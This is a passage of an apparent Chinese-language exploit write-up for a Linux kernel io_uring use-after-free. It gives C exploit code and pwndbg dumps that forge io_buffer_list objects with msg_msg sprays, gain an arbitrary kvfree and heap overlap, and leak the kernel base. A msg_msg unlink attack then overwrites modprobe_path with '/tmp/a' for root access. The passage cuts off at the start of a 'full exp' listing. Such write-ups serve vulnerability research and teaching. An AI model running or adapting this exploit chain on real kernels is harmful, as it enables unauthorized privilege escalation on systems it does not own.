<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; telescope <span class="number">0xffff888005a16000</span></span><br><span class="line">    <span class="comment">/* 第1个io_buffer对象 */</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│  <span class="number">0xffff888005a16000</span> —▸ <span class="number">0xffff8880059f6800</span> —▸ <span class="number">0xffff8880059d56c0</span> ◂— <span class="number">0xffff888005a16000</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│  <span class="number">0xffff888005a16008</span> —▸ <span class="number">0xffff8880059d56c0</span> —▸ <span class="number">0xffff888005a16000</span> —▸ <span class="number">0xffff8880059f6800</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│  <span class="number">0xffff888005a16010</span> —▸ <span class="number">0x1000</span> (cpu_debug_store) ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>│  <span class="number">0xffff888005a16018</span> ◂— <span class="number">0xfd0</span></span><br><span class="line">    <span class="comment">/* 第2个io_buffer对象 */</span></span><br><span class="line"><span class="number">04</span>:<span class="number">0020</span>│  <span class="number">0xffff888005a16020</span> —▸ <span class="number">0xffff888005a16040</span> —▸ <span class="number">0xffff8880059f6c20</span> ◂— <span class="number">0xffff888005a16020</span></span><br><span class="line"><span class="number">05</span>:<span class="number">0028</span>│  <span class="number">0xffff888005a16028</span> —▸ <span class="number">0xffff8880059f6c20</span> —▸ <span class="number">0xffff888005a16020</span> —▸ <span class="number">0xffff888005a16040</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">06</span>:<span class="number">0030</span>│  <span class="number">0xffff888005a16030</span> —▸ <span class="number">0x1bd2b80</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">07</span>:<span class="number">0038</span>│  <span class="number">0xffff888005a16038</span> ◂— <span class="number">0x21000000000100</span></span><br><span class="line">    <span class="comment">/* 第3个io_buffer对象 */</span></span><br><span class="line"><span class="number">08</span>:<span class="number">0040</span>│  <span class="number">0xffff888005a16040</span> —▸ <span class="number">0xffff8880059f6c20</span> —▸ <span class="number">0xffff888005a16020</span> ◂— <span class="number">0xffff888005a16040</span></span><br><span class="line"><span class="number">09</span>:<span class="number">0048</span>│  <span class="number">0xffff888005a16048</span> —▸ <span class="number">0xffff888005a16020</span> —▸ <span class="number">0xffff888005a16040</span> —▸ <span class="number">0xffff8880059f6c20</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">0</span>a:<span class="number">0050</span>│  <span class="number">0xffff888005a16050</span> —▸ <span class="number">0x1bd2c90</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">0b</span>:<span class="number">0058</span>│  <span class="number">0xffff888005a16058</span> ◂— <span class="number">0x21000000000100</span></span><br></pre></td></tr></table></figure>
<ul>
<li>新添加的第2,3个 <code>io_buffer</code> 对象都会链接到 <code>ctx-&gt;io_bl[33]</code> 构成循环链表，利用这一点可以泄露 <code>ctx-&gt;io_bl</code> 的地址（UAF 对象的地址）</li>
</ul>
<p>接下来我想尝试正常释放 <code>ctx-&gt;io_bl</code> 并用其他内核结构体占位，但不管是 <code>io_unregister_pbuf_ring</code> 还是 <code>io_destroy_buffers</code> 都会因为 <code>io_buffer_list</code> 的结构被破坏而执行失败</p>
<p>这里文章采用的利用思路是：</p>
<ul>
<li>利用 <code>msg_msg</code> 伪造 <code>io_buffer_list</code> 对象</li>
<li>然后通过 <code>kvfree(bl-&gt;buf_pages)</code> 获取 kmalloc-2k 上的任意地址 free</li>
<li>构造对象重叠以备后续利用</li>
</ul>
<p>测试脚本如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">    msg_len = <span class="number">0x800</span> - <span class="number">0x30</span>;</span><br><span class="line">    <span class="built_in">memset</span>(msg-&gt;mtext, <span class="number">0x00</span>, msg_len);</span><br><span class="line">    msgsnd(msgid[<span class="number">2</span>], msg, msg_len, <span class="number">0</span>); <span class="comment">/* 创建new msg_msg */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> spray_uring_fd;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">io_uring_params</span> <span class="title">p</span>;</span></span><br><span class="line">    <span class="built_in">memset</span>(&amp;p, <span class="number">0</span>, <span class="keyword">sizeof</span>(p));</span><br><span class="line">    spray_uring_fd = io_uring_setup(<span class="number">0x1</span>, &amp;p); <span class="comment">/* 创建io_ring_ctx */</span></span><br><span class="line">	<span class="comment">/* ps:由于没有开启slub随机化,UAF msg_msg,new msg_msg,io_ring_ctx,三者相邻 */</span></span><br><span class="line"></span><br><span class="line">    ret = msgrcv(msgid[<span class="number">0</span>], buffer, PAGE_SIZE, (<span class="keyword">long</span>)<span class="number">0x0001</span>, <span class="number">0</span>); <span class="comment">/* 释放UAF msg_msg */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IDX(x) (((x)-0x30) / 8)</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">uint64_t</span>* tmp = (<span class="keyword">uint64_t</span>*)msg-&gt;mtext; <span class="comment">// 伪造io_buffer_list </span></span><br><span class="line">    tmp[IDX(<span class="number">0x40</span>)] = io_bl + <span class="number">0x60</span>; <span class="comment">// fake_bl.buf_pages </span></span><br><span class="line">    tmp[IDX(<span class="number">0x48</span>)] = io_bl; <span class="comment">// fake_bl.buf_ring(指向可读区域) </span></span><br><span class="line">    tmp[IDX(<span class="number">0x50</span>)] = <span class="number">0x10000</span>; <span class="comment">// fake_bl.buf_nr_pages = 1 </span></span><br><span class="line">    tmp[IDX(<span class="number">0x60</span>)] = io_bl + <span class="number">0x68</span>; <span class="comment">// 被当做buf_pages[0] </span></span><br><span class="line">    tmp[IDX(<span class="number">0x68</span>)] = <span class="number">0xdeadbeef</span>; <span class="comment">// 被当做page对象 </span></span><br><span class="line"></span><br><span class="line">    tmp[IDX(<span class="number">0x80</span>)] = io_bl + <span class="number">0xa0</span>; <span class="comment">// fake_bl.buf_pages </span></span><br><span class="line">    tmp[IDX(<span class="number">0x88</span>)] = io_bl; <span class="comment">// fake_bl.buf_ring(指向可读区域) </span></span><br><span class="line">    tmp[IDX(<span class="number">0x90</span>)] = <span class="number">0x10000</span>; <span class="comment">// fake_bl.buf_nr_pages = 1 </span></span><br><span class="line">    tmp[IDX(<span class="number">0xa0</span>)] = io_bl + <span class="number">0x1000</span>; <span class="comment">// 被当做buf_pages[0] </span></span><br><span class="line"></span><br><span class="line">    msg_len = <span class="number">0x800</span> - <span class="number">0x30</span>; </span><br><span class="line">    ret = msgsnd(msgid[<span class="number">1</span>], msg, msg_len, <span class="number">0</span>); <span class="comment">/* 重新申请UAF msg_msg */</span></span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">io_uring_buf_reg</span> <span class="title">reg</span>;</span></span><br><span class="line">    <span class="built_in">memset</span>(&amp;reg, <span class="number">0</span>, <span class="keyword">sizeof</span>(reg));</span><br><span class="line">    reg.bgid = <span class="number">0x2</span>;</span><br><span class="line">    ret = io_uring_register(uring_fd, IORING_UNREGISTER_PBUF_RING, &amp;reg, <span class="number">1</span>); <span class="comment">/* 利用__io_remove_buffers()进行任意地址kvfree() */</span></span><br></pre></td></tr></table></figure>
<p>打印 UAF 对象：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; telescope <span class="number">0xffff888005a33800</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│  <span class="number">0xffff888005a33800</span> —▸ <span class="number">0xffff8880059e54c0</span> ◂— <span class="number">0xffff888005a33800</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│  <span class="number">0xffff888005a33808</span> —▸ <span class="number">0xffff8880059e54c0</span> —▸ <span class="number">0xffff888005a33800</span> ◂— <span class="number">0xffff8880059e54c0</span></span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│  <span class="number">0xffff888005a33810</span> ◂— <span class="number">0x1</span></span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>│  <span class="number">0xffff888005a33818</span> ◂— <span class="number">0x7d0</span></span><br><span class="line"><span class="number">04</span>:<span class="number">0020</span>│  <span class="number">0xffff888005a33820</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">05</span>:<span class="number">0028</span>│  <span class="number">0xffff888005a33828</span> —▸ <span class="number">0xffff88800586a288</span> ◂— <span class="number">0x1</span></span><br><span class="line"><span class="number">06</span>:<span class="number">0030</span>│  <span class="number">0xffff888005a33830</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">07</span>:<span class="number">0038</span>│  <span class="number">0xffff888005a33838</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">08</span>:<span class="number">0040</span>│  <span class="number">0xffff888005a33840</span> —▸ <span class="number">0xffff888005a33860</span> —▸ <span class="number">0xffff888005a33868</span> ◂— <span class="number">0xdeadbeef</span></span><br><span class="line"><span class="number">09</span>:<span class="number">0048</span>│  <span class="number">0xffff888005a33848</span> —▸ <span class="number">0xffff888005a33800</span> —▸ <span class="number">0xffff8880059e54c0</span> ◂— <span class="number">0xffff888005a33800</span></span><br><span class="line"><span class="number">0</span>a:<span class="number">0050</span>│  <span class="number">0xffff888005a33850</span> ◂— <span class="number">0x10000</span></span><br><span class="line"><span class="number">0b</span>:<span class="number">0058</span>│  <span class="number">0xffff888005a33858</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">0</span>c:<span class="number">0060</span>│  <span class="number">0xffff888005a33860</span> —▸ <span class="number">0xffff888005a33868</span> ◂— <span class="number">0xdeadbeef</span></span><br><span class="line"><span class="number">0</span>d:<span class="number">0068</span>│  <span class="number">0xffff888005a33868</span> ◂— <span class="number">0xdeadbeef</span></span><br><span class="line"><span class="number">0</span>e:<span class="number">0070</span>│  <span class="number">0xffff888005a33870</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">0f</span>:<span class="number">0078</span>│  <span class="number">0xffff888005a33878</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">10</span>:<span class="number">0080</span>│  <span class="number">0xffff888005a33880</span> —▸ <span class="number">0xffff888005a338a0</span> —▸ <span class="number">0xffff888005a34800</span> ◂— <span class="number">0x607fe0c00e60</span></span><br><span class="line"><span class="number">11</span>:<span class="number">0088</span>│  <span class="number">0xffff888005a33888</span> —▸ <span class="number">0xffff888005a33800</span> —▸ <span class="number">0xffff8880059e54c0</span> ◂— <span class="number">0xffff888005a33800</span></span><br><span class="line"><span class="number">12</span>:<span class="number">0090</span>│  <span class="number">0xffff888005a33890</span> ◂— <span class="number">0x10000</span></span><br><span class="line"><span class="number">13</span>:<span class="number">0098</span>│  <span class="number">0xffff888005a33898</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">14</span>:<span class="number">00</span>a0│  <span class="number">0xffff888005a338a0</span> —▸ <span class="number">0xffff888005a34800</span> ◂— <span class="number">0x607fe0c00e60</span></span><br></pre></td></tr></table></figure>
<ul>
<li>此时已经成功伪造了 <code>io_buffer_list</code></li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">► <span class="number">0xffffffff8132fb6f</span> &lt;__io_uring_register+<span class="number">623</span>&gt;    call   __io_remove_buffers.isra<span class="number">.0</span>           &gt;</span><br><span class="line">       rdi: <span class="number">0xffff888005a33840</span> —▸ <span class="number">0xffff888005a33860</span> —▸ <span class="number">0xffff888005a33868</span> ◂— <span class="number">0xdeadbeef</span></span><br><span class="line">       rsi: <span class="number">0xffffffff</span></span><br><span class="line">       rdx: <span class="number">0xffff888005804880</span> ◂— <span class="number">0x8</span></span><br><span class="line">       rcx: <span class="number">0xffffffff8132fb64</span> (__io_uring_register+<span class="number">612</span>) ◂— mov    esi, <span class="number">0xffffffff</span></span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">► <span class="number">0xffffffff81325ebe</span> &lt;__io_remove_buffers.isra<span class="number">.0</span>+<span class="number">270</span>&gt;    call   kvfree            &lt;kvfree&gt;</span><br><span class="line">       rdi: <span class="number">0xffff888005a33860</span> —▸ <span class="number">0xffff888005a33868</span> ◂— <span class="number">0xdeadbeef</span></span><br><span class="line">       rsi: <span class="number">0x0</span></span><br><span class="line">       rdx: <span class="number">0xffff888005804880</span> ◂— <span class="number">0x8</span></span><br><span class="line">       rcx: <span class="number">0xffffffff81325eb8</span> (__io_remove_buffers.isra<span class="number">.0</span>+<span class="number">264</span>) ◂— mov    rdi, qword ptr [rbx]</span><br></pre></td></tr></table></figure>
<ul>
<li>这里将会释放 <code>io_buffer_list</code> 内部的内存区域，实现堆重叠</li>
</ul>
<p>利用堆重叠可以覆盖位于 UAF <code>msg_msg</code> 下方的另一个 <code>msg_msg</code>，然后溢出读取这个 <code>msg_msg</code> 下方的 <code>io_ring_ctx</code> 对象：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">tmp = (<span class="keyword">uint64_t</span>*)msg-&gt;mtext; <span class="comment">/* 申请到msg_msg+0x60,覆盖new msg_msg */</span></span><br><span class="line">tmp[IDX(<span class="number">0x420</span> - <span class="number">0x60</span>)] = io_bl + <span class="number">0x420</span>; <span class="comment">// 自旋指针,worker继续卡死,不然会导致crash</span></span><br><span class="line"></span><br><span class="line">tmp[IDX(<span class="number">0x800</span> - <span class="number">0x60</span>)] = io_bl + <span class="number">0x830</span>; <span class="comment">// fake_msg.m_list.prev</span></span><br><span class="line">tmp[IDX(<span class="number">0x808</span> - <span class="number">0x60</span>)] = io_bl + <span class="number">0x830</span>; <span class="comment">// fake_msg.m_list.next</span></span><br><span class="line">tmp[IDX(<span class="number">0x810</span> - <span class="number">0x60</span>)] = <span class="number">0x00001</span>; <span class="comment">// fake_msg.m_type</span></span><br><span class="line">tmp[IDX(<span class="number">0x818</span> - <span class="number">0x60</span>)] = <span class="number">0xFD0</span>; <span class="comment">// fake_msg.m_ts</span></span><br><span class="line">tmp[IDX(<span class="number">0x820</span> - <span class="number">0x60</span>)] = <span class="number">0</span>; <span class="comment">// fake_msg.next</span></span><br><span class="line">tmp[IDX(<span class="number">0x828</span> - <span class="number">0x60</span>)] = io_bl + <span class="number">0x840</span>; <span class="comment">// fake_msg.security(指向可读区域)</span></span><br><span class="line">tmp[IDX(<span class="number">0x830</span> - <span class="number">0x60</span>)] = io_bl + <span class="number">0x800</span>; <span class="comment">// 伪造循环链表节点</span></span><br><span class="line">tmp[IDX(<span class="number">0x838</span> - <span class="number">0x60</span>)] = io_bl + <span class="number">0x800</span>;</span><br><span class="line">tmp[IDX(<span class="number">0x840</span> - <span class="number">0x60</span>)] = <span class="number">0xdeadbeef</span>;</span><br><span class="line"></span><br><span class="line">msg_len = <span class="number">0x800</span> - <span class="number">0x30</span>;</span><br><span class="line">ret = msgsnd(msgid[<span class="number">3</span>], msg, msg_len, <span class="number">0</span>); </span><br><span class="line"></span><br><span class="line">msgrcv(msgid[<span class="number">2</span>], buffer, PAGE_SIZE, (<span class="keyword">long</span>)<span class="number">0x0001</span>, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">uint64_t</span>* io_ring_ctx = (<span class="keyword">uint64_t</span>*)(buffer + <span class="number">0x8</span> + <span class="number">0x800</span> - <span class="number">0x30</span>);</span><br><span class="line">print_hex(io_ring_ctx, <span class="number">0x200</span>);</span><br></pre></td></tr></table></figure>
<p>计算出内核基地址后，就可以考虑打 msg_msg unlink attack，往 <code>modprobe_path</code> 中写入自定义脚本的路径</p>
<p>测试脚本如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">msg_len = <span class="number">0x800</span> - <span class="number">0x30</span>;</span><br><span class="line"><span class="built_in">memset</span>(msg-&gt;mtext, <span class="string">&#x27;a&#x27;</span>, msg_len);</span><br><span class="line">msgsnd(msgid[<span class="number">4</span>], msg, msg_len, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">ret = msgrcv(msgid[<span class="number">3</span>], buffer, msg_len, <span class="comment">/* msg_type= */</span> (<span class="keyword">long</span>)<span class="number">0x0001</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">tmp = (<span class="keyword">uint64_t</span>*)msg-&gt;mtext;</span><br><span class="line">tmp[IDX(<span class="number">0x420</span> - <span class="number">0x60</span>)] = io_bl + <span class="number">0x420</span>; <span class="comment">// 自旋指针,worker继续卡死不然会导致crash</span></span><br><span class="line"></span><br><span class="line">tmp[IDX(<span class="number">0x800</span> - <span class="number">0x60</span>)] = modprobe_path - <span class="number">0x8</span>; <span class="comment">// fake_msg.m_list.prev</span></span><br><span class="line">tmp[IDX(<span class="number">0x808</span> - <span class="number">0x60</span>)] = <span class="number">0x612f706d742f</span>; <span class="comment">// fake_msg.m_list.next</span></span><br><span class="line">tmp[IDX(<span class="number">0x810</span> - <span class="number">0x60</span>)] = <span class="number">0x00001</span>; <span class="comment">// fake_msg.m_type</span></span><br><span class="line">tmp[IDX(<span class="number">0x818</span> - <span class="number">0x60</span>)] = <span class="number">0xFD0</span>; <span class="comment">// fake_msg.m_ts</span></span><br><span class="line">tmp[IDX(<span class="number">0x820</span> - <span class="number">0x60</span>)] = <span class="number">0</span>; <span class="comment">// fake_msg.next</span></span><br><span class="line">tmp[IDX(<span class="number">0x828</span> - <span class="number">0x60</span>)] = io_bl + <span class="number">0x840</span>; <span class="comment">// fake_msg.security(指向可读区域)</span></span><br><span class="line"></span><br><span class="line">msg_len = <span class="number">0x800</span> - <span class="number">0x30</span>;</span><br><span class="line">msgsnd(msgid[<span class="number">5</span>], msg, msg_len, <span class="number">0</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;try to msg unlink attack&quot;</span>);</span><br><span class="line">sleep(<span class="number">2</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (fork() == <span class="number">0</span>) &#123; </span><br><span class="line">    msgrcv(msgid[<span class="number">4</span>], buffer, PAGE_SIZE, <span class="comment">/* msg_type= */</span> (<span class="keyword">long</span>)<span class="number">0x0001</span>, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>用同样的方法控制 <code>msg_msg</code>，不过这次的目的是修改 <code>msg_msg.m_list</code>：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">100</span>:<span class="number">0800</span>│  <span class="number">0xffff888005bfd800</span> —▸ <span class="number">0xffffffff82e51258</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">101</span>:<span class="number">0808</span>│  <span class="number">0xffff888005bfd808</span> ◂— <span class="number">0x612f706d742f</span> <span class="comment">/* &#x27;/tmp/a&#x27; */</span></span><br><span class="line"><span class="number">102</span>:<span class="number">0810</span>│  <span class="number">0xffff888005bfd810</span> ◂— <span class="number">0x1</span></span><br><span class="line"><span class="number">103</span>:<span class="number">0818</span>│  <span class="number">0xffff888005bfd818</span> ◂— <span class="number">0xfd0</span></span><br><span class="line"><span class="number">104</span>:<span class="number">0820</span>│  <span class="number">0xffff888005bfd820</span> —▸ <span class="number">0xffff888005bfd420</span> ◂— <span class="number">0xffff888005bfd420</span></span><br><span class="line"><span class="number">105</span>:<span class="number">0828</span>│  <span class="number">0xffff888005bfd828</span> —▸ <span class="number">0xffff888005bfd840</span> ◂— <span class="number">0x6161616161616161</span> (<span class="string">&#x27;aaaaaaaa&#x27;</span>)</span><br><span class="line"><span class="number">106</span>:<span class="number">0830</span>│  <span class="number">0xffff888005bfd830</span> ◂— <span class="number">0x6161616161616161</span> (<span class="string">&#x27;aaaaaaaa&#x27;</span>)</span><br><span class="line"><span class="number">107</span>:<span class="number">0838</span>│  <span class="number">0xffff888005bfd838</span> ◂— <span class="number">0x6161616161616161</span> (<span class="string">&#x27;aaaaaaaa&#x27;</span>)</span><br></pre></td></tr></table></figure>
<p>最后触发 msg_msg unlink attack 即可完成提权</p>
<p>完整 exp 如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span 